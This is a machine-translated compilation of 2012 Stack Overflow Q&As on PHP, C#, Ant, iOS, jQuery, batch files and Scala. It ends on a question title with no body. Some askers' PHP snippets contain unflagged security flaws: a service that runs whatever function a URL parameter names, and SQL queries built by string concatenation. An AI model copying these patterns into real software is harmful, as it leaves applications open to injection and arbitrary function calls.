> 
> 赞同：1
> 
> 时间：2012-05-08T13:00:25.590
> 
> 标签：php, xml, svg

我的程序实际上试图做的是从 xml 文件（曾经是 svg 文件）中获取数据。并以此从 xml 标签中获取相关信息作为属性和值。我的 php 设置是这样的

```
foreach($xml_file_open->g->path[0]->attributes() as $attribute => $value)
{
echo $attribute => $value
} 
```

xml_file_open 属性请求的输出是

```
style="fill:#ff0000;fill-rule:evenodd;stroke:#000000;
stroke-width:1px;stroke-linecap:butt;stroke-linejoin:
miter;stroke-opacity:1"
id="path2987"
d="m 631.42859,603.79077 a 212.85715,162.85715 0 1 1
-425.7143,0 212.85715,162.85715 0 1 1 425.7143,0 z" 
```

（3 行样式和 d 被故意拆分以提高可读性）而不是获取这 3 行数据，我试图获取此标签中的所有内容

```
<path
   sodipodi:type="arc"
   style="fill:#ff0000;fill-rule:evenodd;stroke:#000000;stroke-width:1px;
stroke-linecap:butt;stroke-linejoin:miter;stroke-opacity:1"
   id="path2987"
   sodipodi:cx="418.57144"
   sodipodi:cy="603.79077"
   sodipodi:rx="212.85715"
   sodipodi:ry="162.85715"
   d="m 631.42859,603.79077 a 212.85715,162.85715 0 1 1
 -425.7143,0 212.85715,162.85715 0 1 1 425.7143,0 z" /> 
```

它似乎是 sodipodi: 它不会作为属性读取，我如何让它读取 sodipodi:cx/cy 等作为属性？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-08T13:17:51.920

属性名称的“sodipodi:”部分是命名空间前缀。您如何阅读 XML？如果您使用 DOM API，则可以[通过 DOMNode 类](http://www.php.net/manual/en/class.domnode.php#domnode.props.prefix)获得前缀。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-08T15:07:44.487

将命名空间 URI 传递给 attributes 方法以访问前缀属性：

```
$attrs = $node->attributes('http://inkscape.sourceforge.net/DTD/sodipodi-0.dtd');
echo $attrs['cx']; 
```

更多信息请访问：[http ://us3.php.net/manual/en/simplexmlelement.attributes.php](http://us3.php.net/manual/en/simplexmlelement.attributes.php)

# php - PHP，MYSQL记录未插入

> ID：10499123
> 
> 赞同：-1
> 
> 时间：2012-05-08T13:00:30.707
> 
> 标签：php, mysql

我有这两个mysql表：

```
--
-- Table structure for table `body`
--

DROP TABLE IF EXISTS `body`;
CREATE TABLE IF NOT EXISTS `body` (
`bChar` bigint(10) NOT NULL,
`bPart` bigint(10) NOT NULL,
`bStr` int(3) NOT NULL,
`bDur` int(3) NOT NULL,
`bItem` bigint(10) NOT NULL,
`bHealth` int(3) NOT NULL,
`bSpd` int(3) NOT NULL,
`bMaxDur` int(3) NOT NULL,
`bCurse` int(1) NOT NULL,
`bAct` int(1) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

--
-- Table structure for table `partybody`
--

DROP TABLE IF EXISTS `partybody`;
CREATE TABLE IF NOT EXISTS `partybody` (
`pabChar` bigint(10) NOT NULL,
`pabPart` bigint(10) NOT NULL,
`pabStr` int(3) NOT NULL,
`pabDur` int(3) NOT NULL,
`pabItem` int(10) NOT NULL,
`pabHealth` int(3) NOT NULL,
`pabAct` int(1) NOT NULL,
`pabNum` int(4) NOT NULL,
`pabSlot` int(1) NOT NULL,
`pabSpd` int(3) NOT NULL,
`pabMaxDur` int(3) NOT NULL,
`pabCurse` int(1) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1; 
```

这是正文中的数据：

```
(0, 25, 0, 0, 0, 120, 0, 0, 0, 1) 
```

我有这个 php 代码：

```
$query = "SELECT * FROM body WHERE bChar = ".$_SESSION['chNum'];
$result2 = mysql_query($query, $_SESSION['connect']) or die("Error 3:".mysql_error());
while($row2 = mysql_fetch_array($result2)) {
   query = "INSERT INTO partybody VALUES(".$_SESSION['chNum'].",".$row2['bPart'].",".$row2['bStr'].",".$row2['bDur'].",".$row2['bItem'].",".$row2['bHealth'].",1,1,1,".$row2['bSpd'].",".$row2['bMaxDur'].",".$row2['bCurse'].")";
  mysql_query($query, $_SESSION['connect']) or die("Error 4a:".mysql_error());
} 
```

我刚刚添加`$row2['bCurse']`到`INSERT`，我将错误消息从错误 4：更改为错误 4a：但是当我执行程序时，我得到了这个：

```
Error 4:Column count doesn't match value count at row 1\. 
```

我尝试清除缓存，但没有帮助。想法？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-08T13:20:01.517

如果数据库仍然只填充测试数据，您可以输出所有查询字符串并目视检查是否有问题。寻找可能看起来像这样的查询部分`number,,number`。

```
$query = "SELECT * FROM body WHERE bChar = ".$_SESSION['chNum'];
var_dump($query);
$result2 = mysql_query($query, $_SESSION['connect']) or die("Error 3:".mysql_error());
while($row2 = mysql_fetch_array($result2)) {
   query = "INSERT INTO partybody VALUES(".$_SESSION['chNum'].",".$row2['bPart'].",".$row2['bStr'].",".$row2['bDur'].",".$row2['bItem'].",".$row2['bHealth'].",1,1,1,".$row2['bSpd'].",".$row2['bMaxDur'].",".$row2['bCurse'].")";
   var_dump($query)
   //mysql_query($query, $_SESSION['connect']) or die("Error 4a:".mysql_error());
} 
```

`query`顺便说一句，以下行中的错字前面缺少美元符号吗？

```
query = "INSERT INTO partybody VALUES(".$_SESSION['chNum'].",".$row2['bPart'].",".$row2['bStr'].",".$row2['bDur'].",".$row2['bItem'].",".$row2['bHealth'].",1,1,1,".$row2['bSpd'].",".$row2['bMaxDur'].",".$row2['bCurse'].")"; 
```

# c# - 包含“this”作为参数修饰符的方法签名

> ID：10499124
> 
> 赞同：0
> 
> 时间：2012-05-08T13:00:32.593
> 
> 标签：c#, syntax

当我发现一些具有以下格式的示例代码时，我正在查找如何做某事：

```
public static SecureString ConvertToSecureString(this string password)
{
    // stuff
} 
```

那个“这个”是做什么的？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-05-08T13:02:08.917

它使它成为一种扩展方法，这意味着您将能够：

```
var secureString = "someString".ConvertToSecureString(); 
```

它基本上将功能添加到关键字“this”之后的类型对象的任何实例。

[您可以在此处](http://msdn.microsoft.com/en-us/library/bb383977.aspx)阅读有关扩展方法的更多信息。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-05-08T13:01:59.977

这是一种扩展方法 - 请参阅[http://msdn.microsoft.com/en-us/library/bb383977.aspx](http://msdn.microsoft.com/en-us/library/bb383977.aspx)

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-05-08T13:02:05.457

这是一种扩展方法；在这种情况下，如果您有一个字符串变量，您可以通过调用看似实例方法的方法将其转换为 SecureString 对象

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-05-08T13:02:38.343

它是一种扩展方法，可为对象（例如字符串、int 或自定义类）添加功能。

看：

[http://msdn.microsoft.com/en-us/library/bb383977.aspx](http://msdn.microsoft.com/en-us/library/bb383977.aspx)

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-05-08T13:04:23.283

对于方法扩展，当前解决方案范围内的 secureString 对象将在其方法中添加 ConvertToSecureString 方法；

经验

```
SecureString s = new SecureString ("test"); //whatever is the constructor signature

s.ConvertToSecureString (.....); 
```

# xml - 无法使用 Ant 通过 Cargo 自动启动 jboss？

> ID：10499126
> 
> 赞同：0
> 
> 时间：2012-05-08T13:00:40.770
> 
> 标签：xml, ant, build-automation, cargo

在 Cargo 开源项目的帮助下，我一直在尝试从 Ant 脚本自动启动 JBoss。我得到了下面显示的这个错误。非常感谢！

## 任务定义：

```
 <taskdef resource="cargo.tasks">
        <classpath>
            <pathelement location="${cargo.core.jar}"/>
            <pathelement location="${cargo.ant.jar}"/>
        </classpath>
    </taskdef> 
```

## 使用的罐子：

```
 cargo-core-uberjar-1.2.1.jar
 cargo-ant-1.2.1.jar 
```

## 蚂蚁目标：

```
<!-- Start JBoss -->
<target name="startJboss" depends="prepare">
    <cargo id="mycontainerid" containerId="jboss51x" home="C:/opt/jboss/jboss-4.0.5.GA/bin" action="start" wait="false" />
</target> 
```

## 输出错误：

```
Buildfile: D:\opt\trunk\build.xml
startJboss:

BUILD FAILED
D:\opt\trunk\build.xml:51: Could not create type cargo due to java.lang.NoClassDefFoundError: org/apache/commons/discovery/resource/ClassLoaders

Total time: 2 seconds 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-08T19:19:18.127

如果您使用的是 JBoss 4.0.5.GA，您不应该使用匹配的值来`containerId`代替`jboss51x`吗？（我有一段时间没有使用 Cargo，所以我可能对此有误）

[Cargo - Ant 支持页面](http://cargo.codehaus.org/Ant+support)显示ANT*任务可能还需要一些额外的依赖项。有关详细信息，请参阅安装页面。*; 当我转到[Installation](http://cargo.codehaus.org/Installation)时，它告诉我您需要满足 Cargo 的基本依赖项，其中包括 Commons Discovery（您的错误消息告诉我，缺少）和 Commons Logging。将这些 JAR 添加到您的类路径中，`taskdef`然后再试一次。

# php - 我正在使用 android 中的 xml 解析从服务器获取数据

> ID：10499129
> 
> 赞同：0
> 
> 时间：2012-05-08T13:00:52.930
> 
> 标签：php, android, web-services, xml-parsing

我想在这里使用 xml 解析从服务器获取数据我把我的 php 代码用于返回 xml 输出但是我如何使用 url 运行这个 php 函数并以 xml 格式显示我的 xmloutput

我的 php 服务在这里

```
<?php

include('configuration.php');
include('i_connection.php');

if(function_exists($_GET['f']))
{
    $_GET['f']();

    function getdata($xml_output)
    {   
   $result = mysql_query("SELECT state FROM `pic_upload`");
   $xml_output .="<photo>";

   while($row = mysql_fetch_array($result)) 
   {        
                $xml_output .="<photos>";

                if($result['state'] != "")
                $xml_output .="<State>".$result['state']."</State>";
                else
                $xml_output .="<State></State>";

                $xml_output .="</photos>";
    }
     $xml_output .="</photo>";
  return $xml_output;
}   
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-08T13:13:11.737

这里面有两个部分。

基于 PHP 的服务器端系统如何公开以 XML 格式显示信息的 WEB-SERVICE。一旦你实现了，你应该通过 rest-client 或直接在浏览器的地址栏中运行链接。如果它显示 xml，那么它工作得很好。

对于 android，它就像点击一个 URL 并从连接输入流中读取它的输入。我们通常将其传递给解析器（例如 SAX 解析器、DOM 解析器等）。在应用程序中进一步使用。

两者的示例都可以很容易地用谷歌搜索。

SAX Parser 的好方法是 [http://java-samples.com/showtutorial.php?tutorialid=152](http://java-samples.com/showtutorial.php?tutorialid=152)

# c# - C# 语法 if (value=this || this|| this) 执行此操作

> ID：10499133
> 
> 赞同：3
> 
> 时间：2012-05-08T13:01:14.950
> 
> 标签：c#

只是为了扔一些代码

```
string answer = "hotel"
if (answer == "house"|| answer == "hotel" || answer =="appartment")
{
    DoSomething()
} 
```

我想知道是否有某种方法可以将其缩短为

```
string answer = "hotel"
if (answer == "house"|| "hotel" || "appartment")
{
    DoSomething()
} 
```

我知道 switch 语句

```
switch (answer)
{
    case "house":
    case "hotel":
    case "appartment": DoSomething();
        break;
    default :DoNothing();
} 
```

我只是想知道是否有像我上面描述的那样的语法糖。

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-05-08T13:04:57.247

可以为此使用一些语法糖：

```
if((new[]{"house", "hotel", "apartment"}).Contains(answer))
{
} 
```

请注意，这将动态创建一个新数组，因此可能比仅`Boolean`检查更昂贵。

* * *

## 回答 #2

> 赞同：7
> 
> 时间：2012-05-08T13:05:58.853

您可以使用数组并使用包含。

所以在你的例子中：

```
string answer = "hotel";
string[] acceptable = new string[]{"house", "hotel", "appartment"};
if (acceptable.Contains(answer)){
    DoSomething();
} 
```

* * *

## 回答 #3

> 赞同：4
> 
> 时间：2012-05-08T13:09:09.383

```
public static bool Any<T>(T item, params T[] items)
{
    return items.Contains(item);
} 
```

用法：

```
if (Any(6, 1, 2, 3, 4, 5, 6, 7))
{
    // 6 == 6
}

if (Any("Hi", "a", "cad", "asdf", "hi"))
{
}
else
{
    // "Hi" != "hi" and from anything else.
} 
```

或者：

```
public string[] items = new string[] {"a", "cad", "asdf", "hi"};

...

if (Any("Hi", items))
{
    Works just as well.
} 
```

您还可以进行更高级的比较。例如，如果您想要：

```
if (person.Name == p1.Name ||
    person.Name == p2.Name ||
    person.Name == p3.Name ||
    person.Name == p4.Name ||
    person.Name == p5.Name || ...)
{
} 
```

你可以有：

```
public static bool Any<T>(T item, Func<T, T, bool> equalityChecker, params T[] items)
{
    return items.Any(x => equalityChecker(item, x));
} 
```

并做：

```
if (Any(person, (per1, per2) => p1.Name == p2.Name, p1, p2, p3, p4, p5, ...)
{
} 
```

**编辑**

如果你坚持，你当然可以做一个扩展方法：

```
public static bool Any<T>(this T item, params T[] items)
{
    return items.Contains(item);
} 
```

用法：

```
var b = 6.Any(4, 5, 6, 7); // true 
```

在签名中添加关键字“item”的相同逻辑适用于相等检查器的重载。

* * *

## 回答 #4

> 赞同：3
> 
> 时间：2012-05-08T13:05:03.407

创建一个全局列表，然后用任何方法检查它。

```
List<string> validAnswers = new List<string> {"house", "house1", "apartment"};

if (validAnswers.Contains(answer))
    DoSomething(); 
```

在这种情况下，您`List`不会在每次`answer`检查时生成

* * *

## 回答 #5

> 赞同：2
> 
> 时间：2012-05-08T13:05:36.653

我唯一能想到的就是使用列表或数组：

```
List<String> words = new List<String> { "house", "hotel", "appartment" };
String answer = "house";

if (words.Contains(answer))
{
   DoSomething();
} 
```

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2012-05-08T13:05:38.270

你可以这样做

```
if(new string[]{"house","hotel","appartment"}.Contains(asnwer))
{
...
} 
```

或者

```
if(new List<string>(){"house","hotel","appartment"}.Any(x=>x == answer)
{
} 
```

也可以像扩展方法一样添加它，并使用...

* * *

## 回答 #7

> 赞同：1
> 
> 时间：2012-05-08T13:12:27.570

考虑添加一个可以接受任何字符串的扩展方法......

```
string answer = "hotel"
if (answer.EqualsAny("house", "hotel", "appartment"))
{
    DoSomething()
}
// Extending the thought to another version
if (answer.EqualsAll("house", "hotel", "appartment"))
{
    DoSomething()
}

public static class Extensions
{
    public static bool EqualsAny(this string value, params string[] compareAgainst)
    {
        foreach (var element in compareAgainst)
        {
            if(value == element)
               return true;
        }
        return false;
    }
    public static bool EqualsAll(this string value, params string[] compareAgainst)
    {
        foreach (var element in compareAgainst)
        {
            if(value != element)
                return false;
        }
        return true;
    }
} 
```

* * *

## 回答 #8

> 赞同：0
> 
> 时间：2012-05-08T13:09:47.200

如果您的比较参数是固定的，您可以选择带标志的 ENUM。参考[MSDN](http://msdn.microsoft.com/en-us/library/cc138362.aspx)。然后你可以有想要的行为。你也可以参考这个[帖子](https://stackoverflow.com/questions/2567307/c-sharp-enum-flags-comparison)

* * *

## 回答 #9

> 赞同：0
> 
> 时间：2012-05-08T13:15:37.717

在这种情况下，我通常使用 switch 语句，但正如在上面的几个答案中已经说过的，您可以将结果放入列表或数组中并以这种方式进行检查。

* * *

## 回答 #10

> 赞同：0
> 
> 时间：2012-05-11T21:59:25.903

我会使用这样的扩展方法：

```
public static bool In<T>(this T item, params T[] items)
{
    return items.Contains(item);
} 
```

像这样使用它：

```
if ("hotel".In("house", "hotel", "apartment"))
or
if (1.In(1,2)) 
```

# c# - asp.net mvc 3 剃须刀和 html 表

> ID：10499138
> 
> 赞同：4
> 
> 时间：2012-05-08T13:01:33.140
> 
> 标签：c#, html, css, asp.net-mvc, razor

我有 UsersClass，它永远不会有超过 10 个项目。如何在这样的视图中显示带有表格的用户类？

我想显示两行 10 个单元格

[![](../Images/f745d0c1da5df61bf737ed0efc78ac1e.png)](https://i.stack.imgur.com/hMAFt.jpg)

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2012-05-08T13:15:51.533

与往常一样，在每个 ASP.NET MVC 应用程序中，我建议使用适合视图要求的视图模型。因此，在此视图中，您提到了一个表，您希望在该表中按每行 5 个元素对这些用户进行分组：

```
public class MyViewModel
{
    public int Key { get; set; }
    public IEnumerable<UsersClass> Users { get; set; }
} 
```

然后在控制器动作中：

```
public ActionResult Index()
{
    // that's your domain model => a list of UsersClass
    // could be coming from wherever you want
    var users = Enumerable.Range(1, 7).Select(x => new UsersClass
    {
        Id = x
    });

    // Now let's group those users into the view model:
    // We will have 5 elements per row
    var model = users
        .Select((u, index) => new { User = u, Index = index })
        .GroupBy(x => x.Index / 5)
        .Select(x => new MyViewModel
        {
            Key = x.Key,
            Users = x.Select(y => y.User)
        });
    return View(model);
} 
```

最后，强类型视图非常简单：

```
@model IEnumerable<MyViewModel>
<table>
    @foreach (var item in Model)
    {
        <tr>
            @foreach (var user in item.Users)
            {
                <td>@user.Id</td>
            }

            <!-- That's just to fill the row with the remaining
                 td if we have less than 5 users. Obviously
                 depending on your requirements you could use
                 a single td with a calculated colspan or something else
            -->
            @for (int i = item.Users.Count(); i < 5; i++)
            {
                <td></td>
            }
        </tr>
    }
</table> 
```

显然，可以使用显示模板进一步简化此视图：

```
@model IEnumerable<MyViewModel>
<table>
    @Html.DisplayForModel()
</table> 
```

并在相应的显示模板中：

```
@model MyViewModel
<tr>
    @Html.DisplayFor(x => x.Users)
    @for (int i = item.Users.Count(); i < 5; i++)
    {
        <td></td>
    }
</tr> 
```

和 UsersClass 显示模板：

```
@model UsersClass
<td>@user.Id</td> 
```

结果：

![在此处输入图像描述](../Images/d7b13df75a911e48e569ac0a82341a75.png)

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-05-08T13:21:19.847

不确定这是否正是您要查找的内容，但如果不准确，您应该可以轻松修改它：

```
@* Check to make sure your user class is not null *@
@if (Model.UserClass != null)
{
    <table>
    for (int i = 1; i <= 2; i++)
    {
        <tr>
        for (int j = 1; j <= 5; j++)
        {
            <td>if (Model.UserClass[(j*i)-1] != null) { Model.UserClass[(j*i)-1] }</td>
        }
        </tr>
    }
    </table>
} 
```

我写得很快，但这应该接近你所需要的。

# c++ - C++ 编译器 - 生成的符号类型

> ID：10499139
> 
> 赞同：0
> 
> 时间：2012-05-08T13:01:43.547
> 
> 标签：c++, compiler-construction, compilation, gnu, gnu-toolchain

我很难找到 C++ 编译器究竟如何决定要定义或未定义的符号。我的意思是如何在 C++ 源代码中知道变量/函数是否将被编译为已定义或未定义的符号。首先，我认为所有已定义的变量/函数都将是已定义的符号，但似乎并非如此。考虑到静态，外部，内联，......关键字，有没有办法准确地确定这一点？

*更新问题不在于 C++ 中的定义和声明，也不在于我的代码是否可以编译。现在我认为如果我编译代码并使用 nm 检查目标文件，一些仅在 C++ 源代码中声明的函数/变量会成为定义的符号。我需要这些信息：已定义/声明的 C++ 函数/变量如何编译为对象文件的已定义/未定义符号（例如 ELF）。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-08T13:10:23.283

如果您只声明但不定义变量/函数，它将不会被定义。

```
// In global/namespace scope
int i; // defined
extern int ei; // not defined
extern int eid = 42; // assignment causes it to be defined

void foo(); // not defined
void bar() { } // defined 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-08T15:59:45.340

当您将 foo.cpp 编译为 foo.o 时，在 foo.cpp 中定义的某些符号将出现在 foo.o 中，其他符号将被“内联”。假设这是您的意思，那么您会发现这是特定于编译器和实现定义的。关于 GCC 对内联函数的行为有一个有趣的讨论，例如这里：

[http://gcc.gnu.org/onlinedocs/gcc/Inline.html](http://gcc.gnu.org/onlinedocs/gcc/Inline.html)

# c# - 如何在我的 WCF 服务中公开数据

> ID：10499140
> 
> 赞同：1
> 
> 时间：2012-05-08T13:01:50.573
> 
> 标签：c#, xml, wcf, soa

这是一个有点愚蠢的问题。但是......

我正在公开街道位置的服务。到目前为止，我一直在做的是使用 Entity Framework 获取数据并使用 XElement 将数据解析为 XML。然后在我的服务层中，我返回要在我的服务中公开的 XElement。

这是公开数据的正确方法吗？由于 WCF 使用的是数据协定，它反过来又序列化为 XML，所以自己将其转换为 XML 是一种不好的做法吗？

我也可以返回一个列表来完成同样的事情。但是，这意味着我无法控制 XML 的外观......

我可以遵循哪些最佳实践以及在哪里可以阅读有关最佳实践的一些好的信息。我一直在这个网站上搜索，但在最佳实践方面有很多不同的主题。

谢谢

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-08T13:14:51.393

交换 XML 并不是一个坏习惯，但是，我认为交换类型安全的数据会让您受益更多。只需创建类并用`DataContract`和`DataMember`属性装饰它们。WCF 将负责在您的服务和客户端之间对它们进行序列化。这样，您将在客户端代码中拥有具有类型安全属性的对象，并且这些数据可能更容易使用。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-08T13:09:34.763

我会使用[DataContracts](http://msdn.microsoft.com/en-us/library/ms733127.aspx) ......你不必自己序列化它...... Datacontracts 是（恕我直言）更好的方式。

# c# - 将事件添加到 Windows Phone 的自定义控件

> ID：10499147
> 
> 赞同：1
> 
> 时间：2012-05-08T13:02:08.293
> 
> 标签：c#, windows-phone-7, events, user-controls, custom-component

我正在尝试在 windows phone 中进行自定义控制。我的控件具有名为 Val 的 int 类型的依赖属性。我想添加一个事件，用于 Val 值的任何变化。

我的代码是：

```
public int Val
        {
            get { return (int)GetValue(ValProperty); }
            set { SetValue(ValProperty,value); }
        }

    public static readonly DependencyProperty ValProperty = DependencyProperty.Register("Val", typeof(int), typeof(CT1), new PropertyMetadata(0, ValPropertyChanged));

    private static void ValPropertyChanged(DependencyObject target, DependencyPropertyChangedEventArgs e)
    {
        ((CT1)target).OnValChanged((int)e.OldValue,(int)e.NewValue);
    }

    protected virtual void OnValChanged(int oldvalue, int newvalue)
    {
        //TODO
    } 
```

我不知道从这里开始。需要帮助。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-09T06:18:03.433

明白了。。应该是这样的。

```
protected virtual void OnValChanged(int oldvalue, int newvalue)
        {
            if (ValueChanged != null)
                ValueChanged(this, new ValueChangedEventArgs { OldValue = oldvalue, NewValue = newvalue });
        }

        public delegate void ValueChangedEventHandler(object sender, ValueChangedEventArgs e);

        public event ValueChangedEventHandler ValueChanged; 
```

# iphone - facebook中的图片共享不起作用

> ID：10499150
> 
> 赞同：0
> 
> 时间：2012-05-08T13:02:20.260
> 
> 标签：iphone, objective-c, ios, facebook

```
 NSMutableDictionary *params = [NSMutableDictionary dictionaryWithObjectsAndKeys:
                                 @"parth kausik", @"name", 
                                 imageview.image, @"picture",   
                                 nil];

  [facebook requestWithGraphPath:@"me/photos" andParams:params andHttpMethod:@"POST" andDelegate:self]; 
```

大家好，这些代码不起作用。它没有调用请求代表，也没有上传任何图片。你知道吗..

错误来了....

```
error is:Error Domain=facebookErrDomain Code=10000 "The operation couldn’t be completed. (facebookErrDomain error 10000.)" UserInfo=0x6c592d0 {error=<CFBasicHash 0x6c55f70 [0x12a9b38]>{type = mutable dict, count = 3,
entries =>
    2 : <CFString 0x6c56130 [0x12a9b38]>{contents = "type"} = <CFString 0x6c56820 [0x12a9b38]>{contents = "OAuthException"}
    3 : <CFString 0x6c567c0 [0x12a9b38]>{contents = "message"} = <CFString 0x6c56720 [0x12a9b38]>{contents = "An active access token must be used to query information about the current user."}
    6 : <CFString 0x6c59020 [0x12a9b38]>{contents = "code"} = 2500
}
}
Terminating in response to SpringBoard's termination. 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-11T07:01:51.777

添加社交框架，然后导入类，并添加以下代码

```
 SLComposeViewController *facebookPostVC =[SLComposeViewController composeViewControllerForServiceType:SLServiceTypeFacebook ];
[facebookPostVC setInitialText:@"iPhone Application"];
[facebookPostVC addURL:[NSURL URLWithString:[NSString stringWithFormat:@"%@",link]]];
[facebookPostVC addImage:[UIImage imageNamed:@"Default.png"]];
[self presentViewController:facebookPostVC animated:YES completion:nil]; 
```

注意：这适用于 Xcode 4.5

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-08T15:54:59.317

只需编写参数并按照以下函数中的描述设置图像：

```
- (void) uploadImageWithName : (NSString*)name
{
    NSString *img = [NSString stringWithFormat:@"%@.png",name];
    UIImage *uploadImage = [UIImage imageNamed:img];//you can get the image on other ways also like imageView.image

    NSMutableDictionary* params = [NSMutableDictionary dictionaryWithObjectsAndKeys:
                                   [fb accessToken], 
                                   @"access_token",nil];

    [params setObject:uploadImage forKey:@"source"];

    [fb requestWithGraphPath:@"me/photos"
                             andParams: params
                         andHttpMethod: @"POST"
                           andDelegate:self];

} 
```

# jquery - 引导轮播编号活动图标

> ID：10499154
> 
> 赞同：8
> 
> 时间：2012-05-08T13:02:35.487
> 
> 标签：jquery, twitter-bootstrap, carousel

在此示例中，我已经能够实现带有图标以表示幻灯片 1-3 的 Bootstrap 轮播：http: [//jsfiddle.net/alexmoss/QzVq8/](http://jsfiddle.net/alexmoss/QzVq8/)

我注意到默认情况下将“活动”类添加到幻灯片 1，然后随着活动幻灯片的更改而更改。我想做的就是让子弹也发生这种情况。我已使第一个处于活动状态，但如果幻灯片本身位于幻灯片 2 上，则希望第二个处于活动状态，等等

* * *

## 回答 #1

> 赞同：19
> 
> 时间：2012-05-09T15:51:59.760

基本上计算出当前显示幻灯片的索引，然后使用该索引将“活动”类应用于相应的导航按钮。

```
$('#myCarousel').bind('slid', function() {
    // Get currently selected item
    var item = $('#myCarousel .carousel-inner .item.active');

    // Deactivate all nav links
    $('#carousel-nav a').removeClass('active');

    // Index is 1-based, use this to activate the nav link based on slide
    var index = item.index() + 1;
    $('#carousel-nav a:nth-child(' + index + ')').addClass('active');
}); 
```

您可以清楚地优化代码以使用更少的变量。但是，我特意对其进行了扩展，以便您了解发生了什么。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-08T13:58:34.180

您需要绑定轮播的“滑动”事件。更多细节在这里 -->[如何将“slide”和“slid”事件附加到 Bootstrap 工具包的轮播？](https://stackoverflow.com/questions/9651466/how-to-attach-slide-slid-events-to-the-bootstrap-toolkits-carousel)

# batch-file - 批处理 - FOR 循环问题

> ID：10499161
> 
> 赞同：1
> 
> 时间：2012-05-08T13:03:06.840
> 
> 标签：batch-file

我正在处理的文件（param.txt）是制表符分隔的，第一列的内容是_分隔的。

参数.txt

```
ONE_one  two  three
FOUR_four  five  six
SEVEN_seven  eight  nine 
```

我创建了下面的脚本来处理这个文件：

```
@echo off & setlocal enableextensions enabledelayedexpansion
for /f "tokens=1,2,3 delims=    " %%G in ('type param.txt') do (
  for /f "tokens=1 delims=_" %%a in ('echo %%G') do (
    echo %%a -- %%b -- %%H -- %%I
  )
)
endlocal & goto :EOF 
```

这会产生以下输出：

```
ONE -- %b -- two -- three
FOUR -- %b -- five -- six
SEVEN -- %b -- eight -- nine 
```

需要在脚本中纠正什么以使其打印“值”而不是 %b？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-08T13:10:11.490

尝试替换`tokens=1`为`tokens=1,2`.

另请注意，您可以使用单个 for 循环进行提取，因为您可以指定多个分隔符：

```
for /f "tokens=1,2,3,4 delims=_ " %%G in ('type param.txt') do (
  echo %%G -- %%H -- %%I -- %%J
) 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-08T13:18:57.897

鉴于您提出的方案，JRL 得到了正确的答案。

如果您的第一列中的某个值可能包含像“seven_seven_seven”这样的值，那么您可能只想在第一个`_`. 在这种情况下，您想在第二个 FOR 语句中使用“tokens=1*”。这样 %%b 将包含“seven_seven”。

# scala - 这是 Scala 中的一种高级类型吗？

> ID：10499169
> 
> 赞同：6
> 
> 时间：2012-05-08T13:03:52.663
> 
> 标签：scala, types, type-kinds

有以下定义

```
type MyMap = Map[String, List[Map[Int, String]]] 
```

Map 可以定义为更高种类的类型吗？

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-05-08T13:11:35.177

你所拥有的不是更高种类的类型，但它可以很容易地修改为这样的类型。

```
type MyMap2[A,B,C] = Map[A, List[Map[B, C]]] 
```

现在，我们可以`MyMap`通过提供类型参数再次创建。

```
type MyMap = MyMap2[String, Int, String] 
```

“高等类”只是意味着它是一种无人居住的类型，需要提供其他类型才能创建可居住的类型。

* * *

## 回答 #2

> 赞同：6
> 
> 时间：2012-05-08T13:40:50.320

它不应该。

您可以用值和函数进行类比。您有基本值，它们不是函数，例如`5`和`"foo"`。然后你就有了简单的函数，它接受简单的值作为参数并返回简单的值，例如`+`or `length`。高阶函数是具有其他函数作为参数或结果的函数。例如`takeWhile`,`map`或`foldLeft`是高阶函数。

如果您考虑类型，则有简单类型，它们是值的实际类型，例如`Int`, `String`，甚至`Int => String`还有 List[Double] （现在我考虑每个值，无论是否简单，包括函数）。然后是参数类型，也可以称为类型构造函数（称它们为类型函数会使类比更清楚）。List（没有实例化泛型参数）并不是真正的值类型，您不能将 val 声明为 type `List`，它必须是`List[Something]`。所以 List 可以被认为是一个给定简单类型（比如 Int）返回另一个简单类型（List[Int]）的函数。 `Int`, `String`, and`Double`和 Int => String 被称为有*kind* `*`，而`List`has kind `* -> *`。参数类型，例如`List`或者`Map`类似于简单的函数。

正如高阶函数是带有函数（而不是简单值）参数的函数一样，高阶类型（或有时是高阶类型）是具有类型构造函数参数的类型，而不仅仅是简单的类型参数。它有 kind`(* -> *) -> *`或更复杂的东西。它们用`HigherOrder[C[_]]`或声明`HigherOrder[C[X]]`，以表明类型参数`C`本身是参数类型或类型构造函数。请注意，这必须出现在类型声明中，而不是类型实例化中。`List`被声明为 trait `List[A]`，所以它是参数的，但不是高阶的。如果你用 实例化一个`List[Seq[Map[Int, Set[Double]]]`，那不会使`List`' 的顺序更高。更高阶的类型会接受`List`（而不是`List[Int]`）作为其参数，可以声明`val x : HigherOrder[List] = ...`.

高阶类型在库中不太常见，您可以在集合库的血腥细节中发现一些，例如[GenericCompanion](http://www.scala-lang.org/api/current/index.html#scala.collection.generic.GenericCompanion)。你可以在 scalaz 中找到很多。

# excel - 如何将 xlsx 文件（2010）导入 R 2.15.0

> ID：10499172
> 
> 赞同：4
> 
> 时间：2012-05-08T13:04:07.227
> 
> 标签：excel, r

